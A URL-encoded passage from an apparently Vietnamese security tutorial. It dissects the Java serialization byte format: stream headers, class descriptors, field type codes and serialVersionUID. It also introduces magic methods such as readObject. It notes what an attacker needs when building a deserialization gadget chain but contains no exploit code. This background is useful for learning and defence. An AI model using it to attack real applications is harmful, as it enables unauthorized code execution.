m%E1%BB%99t%20object%20m%E1%BB%9Bi%0A%3E%20%5Bcolor%3D%231e90ff%5D0x73%3A%20TC_OBJECT%0A*%20JVM%20g%E1%BA%B7p%20TC_CLASSDESC%20%E2%86%92%20m%C3%B4%20t%E1%BA%A3%20class%20%C4%91%C6%B0%E1%BB%A3c%20serialize%0A%3E%20%5Bcolor%3D%231e90ff%5D0x72%3A%20TC_CLASSDESC%0A00%2004%3A%20%C4%91%E1%BB%99%20d%C3%A0i%20t%C3%AAn%20class%20l%C3%A0%204%20bytes%0A55%2073%2065%2072%3A%20ASCII%20%3D%20User%0A1C%2054%2011%2043%2062%2088%2006%2036%3A%20serialVersionUID%20c%E1%BB%A7a%20class%20User%0A0x02%3A%20Flags%20%E2%80%93%20class%20n%C3%A0y%20implements%20Serializable%0A00%2002%3A%20s%E1%BB%91%20l%C6%B0%E1%BB%A3ng%20field%20%3D%202%0A*%20JVM%20%C4%91%E1%BB%8Dc%20metadata%20c%E1%BB%A7a%20t%E1%BB%ABng%20field%0A%3E%20%5Bcolor%3D%231e90ff%5DField%201%3A%0A%3E%20%5Bcolor%3D%231e90ff%5D0x49%3A%20m%C3%A3%20ki%E1%BB%83u%20I%20%E2%80%93%20int%0A%3E00%2003%3A%20%C4%91%E1%BB%99%20d%C3%A0i%20t%C3%AAn%20field%20%3D%203%0A%3E61%2067%2065%20%E2%86%92%20%22age%22%0AField%202%3A%0A%3E%20%5Bcolor%3D%231e90ff%5D0x4C%3A%20m%C3%A3%20ki%E1%BB%83u%20L%20%E2%80%93%20object%0A00%2004%3A%20%C4%91%E1%BB%99%20d%C3%A0i%20t%C3%AAn%20field%20%3D%204%0A6E%2061%206D%2065%20%E2%86%92%20%22name%22%0A0x74%2000%2012%20%E2%86%92%20TC_STRING%20v%E1%BB%9Bi%20%C4%91%E1%BB%99%20d%C3%A0i%2018%20bytes%0A4C%206A%2061%2076%2061%202F%206C%2061%206E%2067%202F%2053%2074%2072%2069%206E%2067%203B%20%E2%86%92%20%22Ljava%2Flang%2FString%3B%22%0A*%20JVM%20g%E1%BA%B7p%20TC_ENDBLOCKDATA%20v%C3%A0%20TC_NULL%0A%3E%20%5Bcolor%3D%231e90ff%5D0x78%3A%20k%E1%BA%BFt%20th%C3%BAc%20block%20d%E1%BB%AF%20li%E1%BB%87u%20metadata%0A0x70%3A%20kh%C3%B4ng%20c%C3%B3%20superclass%20(ngo%C3%A0i%20Object%2C%20v%E1%BB%91n%20kh%C3%B4ng%20%C4%91%C6%B0%E1%BB%A3c%20serialize)%0A*%20JVM%20kh%E1%BB%9Fi%20t%E1%BA%A1o%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20User%0A**Giai%20%C4%91o%E1%BA%A1n%201**%3A%20T%E1%BA%A1o%20object%20r%E1%BB%97ng%0AV%C3%AC%20User%20implements%20Serializable%2C%20n%C3%AAn%20JVM%20s%E1%BA%BD%20b%E1%BB%8F%20qua%20constructor%0AJVM%20t%C3%ACm%20%C4%91%E1%BA%BFn%20l%E1%BB%9Bp%20cha%20kh%C3%B4ng%20serializable%20(trong%20tr%C6%B0%E1%BB%9Dng%20h%E1%BB%A3p%20n%C3%A0y%20l%C3%A0%20Object)%20v%C3%A0%20g%E1%BB%8Di%20default%20constructor%20c%E1%BB%A7a%20Object%20%C4%91%E1%BB%83%20t%E1%BA%A1o%20object.%0A**Giai%20%C4%91o%E1%BA%A1n%202**%3A%20Ghi%20d%E1%BB%AF%20li%E1%BB%87u%20v%C3%A0o%20object%0AJVM%20%C4%91%E1%BB%8Dc%20ti%E1%BA%BFp%20d%E1%BB%AF%20li%E1%BB%87u%3A%0A%3E%20%5Bcolor%3D%231e90ff%5D00%2000%2000%2014%20%20%E2%86%92%2020%20(gi%C3%A1%20tr%E1%BB%8B%20c%E1%BB%A7a%20field%20%60age%60)%0A0x74%2000%2004%20%E2%86%92%20TC_STRING%20c%C3%B3%20%C4%91%E1%BB%99%20d%C3%A0i%204%3A%0A65%206E%2064%2079%20%E2%86%92%20%22endy%22%20%E2%86%92%20gi%C3%A1%20tr%E1%BB%8B%20c%E1%BB%A7a%20field%20name%0A%0A*%20K%E1%BA%BFt%20qu%E1%BA%A3%20sau%20deserialization%3A%0A%60%60%60java%0AUser%20deserializedObject%20%3D%20(User)%20objectIn.readObject()%3B%0ASystem.out.println(%22Name%3A%20%22%20%2B%20deserializedObject.getName())%3B%20%2F%2F%20endy%0ASystem.out.println(%22Age%3A%20%22%20%2B%20deserializedObject.getAge())%3B%20%20%20%2F%2F%2020%0A%60%60%60%0ATham%20kh%E1%BA%A3o%3A%5BThe%20Java%20serialization%20algorithm%20revealed%5D(https%3A%2F%2Fwww.infoworld.com%2Farticle%2F2072752%2Fthe-java-serialization-algorithm-revealed.html)%2C%20%5BOracle%5D(https%3A%2F%2Fdocs.oracle.com%2Fjavase%2Fspecs%2Fjvms%2Fse9%2Fhtml%2Fjvms-4.html)%0A%0A%23%23%23%23%202.4%20Serialize%20data%0AN%C3%A3y%20gi%E1%BB%9D%20ch%C3%BAng%20ta%20%C4%91%C3%A3%20th%E1%BA%A5y%20%C4%91%C6%B0%E1%BB%A3c%20qu%C3%A1%20tr%C3%ACnh%20de%2Fserialization%20trong%20java%2C%20c%C3%A1c%20d%E1%BB%AF%20li%E1%BB%87u%20c%C3%B3%20%C4%91%C6%B0%E1%BB%A3c%20sau%20qu%C3%A1%20tr%C3%ACnh%20serialization%20v%C3%A0%20s%E1%BA%BD%20s%E1%BB%AD%20d%E1%BB%A5ng%20khi%20b%E1%BA%AFt%20%C4%91%E1%BA%A7u%20qu%C3%A1%20tr%C3%ACnh%20deserialization%20g%E1%BB%8Di%20l%C3%A0%20serialize%20data.%20Ch%C3%BAng%20ta%20c%C3%B3%20th%E1%BB%83%20kh%C3%B4ng%20c%E1%BA%A7n%20hi%E1%BB%83u%20h%E1%BA%BFt%20c%C3%A1c%20kh%C3%A1i%20ni%E1%BB%87m%20v%C3%A0%20%C4%91%E1%BB%8Bnh%20ngh%C4%A9a%20c%E1%BB%A7a%20serialize%20data%20%C4%91%E1%BB%83%20bi%E1%BA%BFt%20%C4%91%C6%B0%E1%BB%A3c%20n%E1%BB%99i%20dung%20c%E1%BB%A7a%20n%C3%B3%20v%C3%AC%20b%C3%A2y%20gi%E1%BB%9D%20c%C3%B3%201%20s%E1%BB%91%20tool%20s%E1%BA%BD%20l%C3%A0m%20%C4%91i%E1%BB%81u%20%C4%91%C3%B3%20cho%20ch%C3%BAng%20ta%20m%C3%A0%20x%C3%AD%20n%E1%BB%AFa%20m%C3%ACnh%20s%E1%BA%BD%20gi%E1%BB%9Bi%20thi%E1%BB%87u%2C%20nh%C6%B0ng%20ch%C3%BAng%20ta%20ph%E1%BA%A3i%20bi%E1%BA%BFt%201%20s%E1%BB%91%20th%E1%BB%A9%20c%C6%A1%20b%E1%BA%A3n%20c%E1%BB%A7a%20serialize%20data.%0A!%5Bfile%20signaute%20trong%20serialize%20data%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FH123qX8Ugl.png)%0A*%20%C4%90%E1%BA%A7u%20ti%C3%AAn%20ch%C3%BAng%20ta%20%C4%91%E1%BA%BFn%20v%E1%BB%9Bi%20file%20signature.%20Khi%20m%E1%BB%99t%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20trong%20Java%20%C4%91%C6%B0%E1%BB%A3c%20tu%E1%BA%A7n%20t%E1%BB%B1%20h%C3%B3a%20(serialized)%20v%C3%A0%20ghi%20ra%20file%20ho%E1%BA%B7c%20truy%E1%BB%81n%20qua%20m%E1%BA%A1ng%2C%20d%E1%BB%AF%20li%E1%BB%87u%20k%E1%BA%BFt%20qu%E1%BA%A3%20s%E1%BA%BD%20b%E1%BA%AFt%20%C4%91%E1%BA%A7u%20b%E1%BA%B1ng%20m%E1%BB%99t%20chu%E1%BB%97i%20byte%20%C4%91%E1%BA%B7c%20bi%E1%BB%87t%20g%E1%BB%8Di%20l%C3%A0%20file%20signature%20hay%20magic%20number.%20%C4%90%C3%A2y%20l%C3%A0%20d%E1%BA%A5u%20hi%E1%BB%87u%20nh%E1%BA%ADn%20bi%E1%BA%BFt%20m%E1%BB%99t%20lu%E1%BB%93ng%20d%E1%BB%AF%20li%E1%BB%87u%20%C4%91%C6%B0%E1%BB%A3c%20tu%E1%BA%A7n%20t%E1%BB%B1%20h%C3%B3a%20theo%20chu%E1%BA%A9n%20Java%20Serialization.(m%C3%ACnh%20%C4%91%C3%A3%20gi%E1%BA%A3i%20th%C3%ADch%20r%C3%B5%20h%C6%A1n%20%E1%BB%9F%20ph%E1%BA%A7n%202.3%2C%20%E1%BB%9F%20%C4%91%C3%A2y%20m%C3%ACnh%20ch%E1%BB%89%20%C4%91%E1%BB%8Bnh%20ngh%C4%A9a%20c%C6%A1%20b%E1%BA%A3n)%0A*%20Signature%20n%C3%A0y%20%C4%91%C6%B0%E1%BB%A3c%20s%E1%BB%AD%20d%E1%BB%A5ng%20b%E1%BB%9Fi%20Java%20Virtual%20Machine%20(JVM)%20v%C3%A0%20c%C3%A1c%20c%C3%B4ng%20c%E1%BB%A5%20ph%C3%A2n%20t%C3%ADch%20%C4%91%E1%BB%83%20x%C3%A1c%20%C4%91%E1%BB%8Bnh%20v%C3%A0%20x%E1%BB%AD%20l%C3%BD%20d%E1%BB%AF%20li%E1%BB%87u%20%C4%91%C3%A3%20serialize.%20N%E1%BA%BFu%20m%E1%BB%99t%20file%20kh%C3%B4ng%20c%C3%B3%20%C4%91%E1%BB%8Bnh%20danh%20n%C3%A0y%20%E1%BB%9F%20ph%E1%BA%A7n%20%C4%91%E1%BA%A7u%2C%20JVM%20s%E1%BA%BD%20kh%C3%B4ng%20coi%20%C4%91%C3%B3%20l%C3%A0%20m%E1%BB%99t%20serialized%20object%20h%E1%BB%A3p%20l%E1%BB%87.%0A!%5Bclass%20name%20trong%20serialize%20data%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FS1z76mUUle.png)%0A*%20Sau%20ph%E1%BA%A7n%20file%20signature%2C%20Java%20Serialization%20stream%20s%E1%BA%BD%20ch%E1%BB%A9a%20th%C3%B4ng%20tin%20v%E1%BB%81%20t%C3%AAn%20l%E1%BB%9Bp%20(class%20name)%20c%E1%BB%A7a%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20%C4%91%C6%B0%E1%BB%A3c%20tu%E1%BA%A7n%20t%E1%BB%B1%20h%C3%B3a.%20Ph%E1%BA%A7n%20n%C3%A0y%20n%E1%BA%B1m%20trong%20Class%20Descriptor%2C%20m%C3%B4%20t%E1%BA%A3%20l%E1%BB%9Bp%20c%E1%BB%A7a%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng.%20%0A*%20Th%C3%B4ng%20tin%20class%20name%20gi%C3%BAp%20JVM%20bi%E1%BA%BFt%20%C4%91%C6%B0%E1%BB%A3c%20ki%E1%BB%83u%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20%C4%91ang%20%C4%91%C6%B0%E1%BB%A3c%20deserialize%20v%C3%A0%20%C4%91%E1%BA%A3m%20b%E1%BA%A3o%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20t%C3%A1i%20t%E1%BA%A1o%20%C4%91%C3%BAng%20l%E1%BB%9Bp%20ban%20%C4%91%E1%BA%A7u.%20N%E1%BA%BFu%20kh%C3%B4ng%20kh%E1%BB%9Bp%20t%C3%AAn%20l%E1%BB%9Bp%2C%20deserialization%20s%E1%BA%BD%20th%E1%BA%A5t%20b%E1%BA%A1i%20ho%E1%BA%B7c%20n%C3%A9m%20l%E1%BB%97i%20%60ClassNotFoundException%60.%0A!%5Battribute%20name%20trong%20serialize%20data%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHyDj67UIge.png)%0A*%20Sau%20khi%20JVM%20ghi%20t%C3%AAn%20l%E1%BB%9Bp%20v%C3%A0o%20lu%E1%BB%93ng%20byte%20trong%20qu%C3%A1%20tr%C3%ACnh%20serialize%2C%20n%C3%B3%20ti%E1%BA%BFp%20t%E1%BB%A5c%20ghi%20th%C3%B4ng%20tin%20chi%20ti%E1%BA%BFt%20v%E1%BB%81%20c%C3%A1c%20thu%E1%BB%99c%20t%C3%ADnh%20(fields)%20c%E1%BB%A7a%20l%E1%BB%9Bp.%20M%E1%BB%97i%20field%20s%E1%BA%BD%20c%C3%B3%3A%0A%60%60%60markdown%0A%7C%20Th%C3%A0nh%20ph%E1%BA%A7n%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20M%C3%B4%20t%E1%BA%A3%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20------------------------------------%20%7C%20-------------------------------------------------------------------------%20%7C%0A%7C%20**Field%20type%20code**%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20K%C3%BD%20hi%E1%BB%87u%201%20byte%20%C4%91%E1%BA%A1i%20di%E1%BB%87n%20cho%20ki%E1%BB%83u%20d%E1%BB%AF%20li%E1%BB%87u%20(v%C3%AD%20d%E1%BB%A5%3A%20%60I%60%20%3D%20int%2C%20%60L%60%20%3D%20object)%20%7C%0A%7C%20**Field%20name%20length%20%2B%20name**%20%20%20%20%20%20%20%20%20%7C%20%C4%90%E1%BB%99%20d%C3%A0i%20v%C3%A0%20t%C3%AAn%20thu%E1%BB%99c%20t%C3%ADnh%20(UTF-8)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20**Field%20class%20name**%20(n%E1%BA%BFu%20l%C3%A0%20object)%20%7C%20T%C3%AAn%20l%E1%BB%9Bp%20n%E1%BA%BFu%20field%20c%C3%B3%20ki%E1%BB%83u%20l%C3%A0%20object%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%60%60%60%0A!%5Bki%E1%BB%83u%20d%E1%BB%AF%20li%E1%BB%87u%20trong%20serialize%20data%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHynYx488xe.png)%0A*%20Trong%20Java%20Serialization%2C%20m%E1%BB%97i%20thu%E1%BB%99c%20t%C3%ADnh%20(field)%20c%E1%BB%A7a%20m%E1%BB%99t%20l%E1%BB%9Bp%20%C4%91%C6%B0%E1%BB%A3c%20l%C6%B0u%20tr%E1%BB%AF%20k%C3%A8m%20theo%20m%E1%BB%99t%20m%C3%A3%20k%C3%BD%20hi%E1%BB%87u%201%20byte%20g%E1%BB%8Di%20l%C3%A0%20Field%20Type%20Code%2C%20d%C3%B9ng%20%C4%91%E1%BB%83%20ch%E1%BB%89%20%C4%91%E1%BB%8Bnh%20ki%E1%BB%83u%20d%E1%BB%AF%20li%E1%BB%87u%20c%E1%BB%A7a%20thu%E1%BB%99c%20t%C3%ADnh%20%C4%91%C3%B3.%20%C4%90i%E1%BB%81u%20n%C3%A0y%20gi%C3%BAp%20cho%20Java%20Virtual%20Machine%20(JVM)%20hi%E1%BB%83u%20%C4%91%C6%B0%E1%BB%A3c%20c%C3%A1ch%20gi%E1%BA%A3i%20m%C3%A3%20d%E1%BB%AF%20li%E1%BB%87u%20t%E1%BB%AB%20byte%20stream%20khi%20deserialize.%0A*%20B%E1%BA%A3ng%20Field%20Type%20Code%0A%60%60%60markdown%0A%7C%20K%C3%BD%20hi%E1%BB%87u%20%7C%20Ki%E1%BB%83u%20d%E1%BB%AF%20li%E1%BB%87u%20Java%20c%C6%A1%20b%E1%BA%A3n%20%20%20%20%20%20%20%7C%20Ghi%20ch%C3%BA%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C--------%7C-------------------------------%7C-----------------------------%7C%0A%7C%20B%20%20%20%20%20%20%7C%20%60byte%60%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20C%20%20%20%20%20%20%7C%20%60char%60%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20D%20%20%20%20%20%20%7C%20%60double%60%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20F%20%20%20%20%20%20%7C%20%60float%60%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20I%20%20%20%20%20%20%7C%20%60int%60%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20J%20%20%20%20%20%20%7C%20%60long%60%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20S%20%20%20%20%20%20%7C%20%60short%60%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Z%20%20%20%20%20%20%7C%20%60boolean%60%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20L%20%20%20%20%20%20%7C%20Object%20(tham%20chi%E1%BA%BFu%20l%E1%BB%9Bp)%20%20%20%20%20%20%20%7C%20Theo%20sau%20l%C3%A0%20t%C3%AAn%20l%E1%BB%9Bp%2C%20k%E1%BA%BFt%20th%C3%BAc%20b%E1%BA%B1ng%20%60%3B%60%20%7C%0A%7C%20%5B%20%20%20%20%20%20%7C%20M%E1%BA%A3ng%20(array)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20Theo%20sau%20l%C3%A0%20ki%E1%BB%83u%20ph%E1%BA%A7n%20t%E1%BB%AD%20%20%20%20%20%7C%0A%0A%60%60%60%0A!%5BGi%C3%A1%20tr%E1%BB%8B%20c%E1%BB%A7a%20thu%E1%BB%99c%20t%C3%ADnh%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBJe9bN88xx.png)%0A*%20Sau%20khi%20ghi%20th%C3%B4ng%20tin%20v%E1%BB%81%20ki%E1%BB%83u%20d%E1%BB%AF%20li%E1%BB%87u%20(Field%20Type%20Code)%20v%C3%A0%20t%C3%AAn%20attribute%2C%20Java%20Serialization%20s%E1%BA%BD%20ti%E1%BA%BFp%20t%E1%BB%A5c%20l%C6%B0u%20gi%C3%A1%20tr%E1%BB%8B%20(value)%20t%C6%B0%C6%A1ng%20%E1%BB%A9ng%20c%E1%BB%A7a%20m%E1%BB%97i%20thu%E1%BB%99c%20t%C3%ADnh%20theo%20th%E1%BB%A9%20t%E1%BB%B1%20%C4%91%C3%A3%20khai%20b%C3%A1o%20trong%20class%20(t%C3%ADnh%20c%E1%BA%A3%20c%C3%A1c%20thu%E1%BB%99c%20t%C3%ADnh%20k%E1%BA%BF%20th%E1%BB%ABa).%0A*%20%20V%E1%BB%9Bi%20c%C3%A1ch%20ghi%20gi%C3%A1%20tr%E1%BB%8B%2C%20v%E1%BB%9Bi%20ki%E1%BB%83u%20d%E1%BB%AF%20li%E1%BB%87u%20nguy%C3%AAn%20th%E1%BB%A7y%20(primitive).%20Th%C3%AC%20Gi%C3%A1%20tr%E1%BB%8B%20%C4%91%C6%B0%E1%BB%A3c%20ghi%20tr%E1%BB%B1c%20ti%E1%BA%BFp%20theo%20%C4%91%C3%BAng%20k%C3%ADch%20th%C6%B0%E1%BB%9Bc%20ki%E1%BB%83u%20d%E1%BB%AF%20li%E1%BB%87u%3A%0A%60%60%60markdown%0A%7C%20Ki%E1%BB%83u%20%20%20%20%7C%20K%C3%ADch%20th%C6%B0%E1%BB%9Bc%20%7C%20Ghi%20ch%C3%BA%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20-------%20%7C%20----------%20%7C%20-----------------------------%20%7C%0A%7C%20int%20%20%20%20%20%7C%204%20byte%20%20%20%20%20%7C%20D%E1%BA%A1ng%20big-endian%20(MSB%20tr%C6%B0%E1%BB%9Bc)%20%20%20%7C%0A%7C%20long%20%20%20%20%7C%208%20byte%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20short%20%20%20%7C%202%20byte%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20byte%20%20%20%20%7C%201%20byte%20%20%20%20%20%7C%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20char%20%20%20%20%7C%202%20byte%20%20%20%20%20%7C%20M%C3%A3%20Unicode%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20float%20%20%20%7C%204%20byte%20%20%20%20%20%7C%20IEEE%20754%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20double%20%20%7C%208%20byte%20%20%20%20%20%7C%20IEEE%20754%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20boolean%20%7C%201%20byte%20%20%20%20%20%7C%20%600x00%60%20%3D%20false%2C%20%600x01%60%20%3D%20true%20%7C%0A%60%60%60%0A*%20V%E1%BB%9Bi%20ki%E1%BB%83u%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20(object%20ho%E1%BA%B7c%20m%E1%BA%A3ng)%0A%3E%20%5Bcolor%3D%231e90ff%5D%0A%3E%20*%20N%E1%BA%BFu%20gi%C3%A1%20tr%E1%BB%8B%20l%C3%A0%20null%20%E2%86%92%20ghi%20TC_NULL%20(0x70)%0A%3E*%20N%E1%BA%BFu%20l%C3%A0%20object%20ch%C6%B0a%20ghi%20tr%C6%B0%E1%BB%9Bc%20%C4%91%C3%B3%20%E2%86%92%20ghi%20m%C3%B4%20t%E1%BA%A3%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20v%C3%A0%20gi%C3%A1%20tr%E1%BB%8B%20c%E1%BB%A7a%20n%C3%B3%0A%3E*%20N%E1%BA%BFu%20l%C3%A0%20object%20%C4%91%C3%A3%20xu%E1%BA%A5t%20hi%E1%BB%87n%20tr%C6%B0%E1%BB%9Bc%20%E2%86%92%20ghi%20TC_REFERENCE%20k%C3%A8m%20theo%20handle%20reference%0A%0A*%20V%E1%BB%9Bi%20c%C3%A1c%20object%20t%C3%B9y%20ch%E1%BB%89nh%3A%0AN%E1%BA%BFu%20l%C3%A0%20class%20do%20ng%C6%B0%E1%BB%9Di%20d%C3%B9ng%20%C4%91%E1%BB%8Bnh%20ngh%C4%A9a%20v%C3%A0%20c%C3%B3%20implements%20Serializable%2C%20to%C3%A0n%20b%E1%BB%99%20tr%E1%BA%A1ng%20th%C3%A1i%20c%E1%BB%A7a%20object%20s%E1%BA%BD%20%C4%91%C6%B0%E1%BB%A3c%20serialize%20%C4%91%E1%BB%87%20quy%20theo%20th%E1%BB%A9%20t%E1%BB%B1%20field.%0A%0A!%5Bserial%20version%20uid%20trong%20serialize%20data%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHkVN7NULlg.png)%0A*%20**serialVersionUID**%20l%C3%A0%20m%E1%BB%99t%20gi%C3%A1%20tr%E1%BB%8B%20*long*%20%C4%91%E1%BA%B7c%20bi%E1%BB%87t%20%C4%91%C6%B0%E1%BB%A3c%20Java%20s%E1%BB%AD%20d%E1%BB%A5ng%20trong%20qu%C3%A1%20tr%C3%ACnh%20deserialization%20%C4%91%E1%BB%83%20x%C3%A1c%20%C4%91%E1%BB%8Bnh%20phi%C3%AAn%20b%E1%BA%A3n%20c%E1%BB%A7a%20m%E1%BB%99t%20l%E1%BB%9Bp%20Serializable.%20M%E1%BB%97i%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20%C4%91%C6%B0%E1%BB%A3c%20ghi%20xu%E1%BB%91ng%20d%C6%B0%E1%BB%9Bi%20d%E1%BA%A1ng%20serialized%20s%E1%BA%BD%20k%C3%A8m%20theo%20**serialVersionUID**%20c%E1%BB%A7a%20class%20t%E1%BA%A1i%20th%E1%BB%9Di%20%C4%91i%E1%BB%83m%20%C4%91%C3%B3.%0A*%20Khi%20deserialization%2C%20JVM%20s%E1%BA%BD%20so%20s%C3%A1nh%20**serialVersionUID**%20trong%20d%E1%BB%AF%20li%E1%BB%87u%20v%E1%BB%9Bi%20UID%20c%E1%BB%A7a%20class%20hi%E1%BB%87n%20t%E1%BA%A1i.%20N%E1%BA%BFu%20kh%C3%B4ng%20kh%E1%BB%9Bp%20%E2%86%92%20JVM%20n%C3%A9m%20l%E1%BB%97i%20InvalidClassException%2C%20ng%C4%83n%20qu%C3%A1%20tr%C3%ACnh%20kh%C3%B4i%20ph%E1%BB%A5c%20object.%0A*%20V%C3%AC%20v%E1%BA%ADy%20khi%20t%E1%BA%A5n%20c%C3%B4ng%20Java%20Deserialization%3A%0A%3E%20%5Bcolor%3D%231e90ff%5D%0A%3E%20*%20Attacker%20ph%E1%BA%A3i%20d%C3%B9ng%20%C4%91%C3%BAng%20class%20%C4%91%C3%A3%20t%E1%BB%93n%20t%E1%BA%A1i%20trong%20classpath%20c%E1%BB%A7a%20%E1%BB%A9ng%20d%E1%BB%A5ng%20m%E1%BB%A5c%20ti%C3%AAu.%0A%3E*%20V%C3%A0%20class%20%C4%91%C3%B3%20ph%E1%BA%A3i%20c%C3%B3%20serialVersionUID%20tr%C3%B9ng%20kh%E1%BB%9Bp%20v%E1%BB%9Bi%20d%E1%BB%AF%20li%E1%BB%87u%20serialized%20m%C3%A0%20attacker%20g%E1%BB%ADi.%0A%3E*%20%C4%90i%E1%BB%81u%20n%C3%A0y%20r%E1%BA%A5t%20quan%20tr%E1%BB%8Dng%20khi%20x%C3%A2y%20d%E1%BB%B1ng%20gadget%20chain%2C%20v%C3%AC%20ch%E1%BB%89%20c%E1%BA%A7n%20sai%20UID%2C%20chu%E1%BB%97i%20t%E1%BA%A5n%20c%C3%B4ng%20s%E1%BA%BD%20b%E1%BB%8B%20JVM%20t%E1%BB%AB%20ch%E1%BB%91i.%0A%0A-%3E%20Do%20%C4%91%C3%B3%2C%20vi%E1%BB%87c%20x%C3%A1c%20%C4%91%E1%BB%8Bnh%20%C4%91%C3%BAng%20serialVersionUID%20l%C3%A0%20%C4%91i%E1%BB%81u%20ki%E1%BB%87n%20b%E1%BA%AFt%20bu%E1%BB%99c%20%C4%91%E1%BB%83%20pentester%20c%C3%B3%20th%E1%BB%83%20khai%20th%C3%A1c%20l%E1%BB%97%20h%E1%BB%95ng%20Java%20Deserialization%20th%C3%A0nh%20c%C3%B4ng.%0A%0ATham%20kh%E1%BA%A3o%3A%20%5Bgyyyy%40%E7%8C%8E%E6%88%B7%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E5%AE%A4%5D(https%3A%2F%2Fpaper.seebug.org%2F792%2F)%0A%0A%23%23%23%23%202.5%20Java%20magic%20method%0A!%5Bmagic%20method%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FByrWAELUgg.png)%0ATrong%20Java%2C%20magic%20method%20l%C3%A0%20nh%E1%BB%AFng%20ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%20%C4%91%E1%BA%B7c%20bi%E1%BB%87t%20%C4%91%C6%B0%E1%BB%A3c%20JVM%20ho%E1%BA%B7c%20framework%20t%E1%BB%B1%20%C4%91%E1%BB%99ng%20g%E1%BB%8Di%20trong%20m%E1%BB%99t%20s%E1%BB%91%20t%C3%ACnh%20hu%E1%BB%91ng%20c%E1%BB%A5%20th%E1%BB%83%2C%20kh%C3%B4ng%20c%E1%BA%A7n%20g%E1%BB%8Di%20tr%E1%BB%B1c%20ti%E1%BA%BFp%20t%E1%BB%AB%20l%E1%BA%ADp%20tr%C3%ACnh%20vi%C3%AAn.%20Khi%20m%E1%BB%99t%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20%C4%91%C6%B0%E1%BB%A3c%20serialize%2Fdeserialize%2C%20JVM%20s%E1%BA%BD%20t%C3%ACm%20ki%E1%BA%BFm%20v%C3%A0%20g%E1%BB%8Di%20c%C3%A1c%20ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%20nh%C6%B0%20readO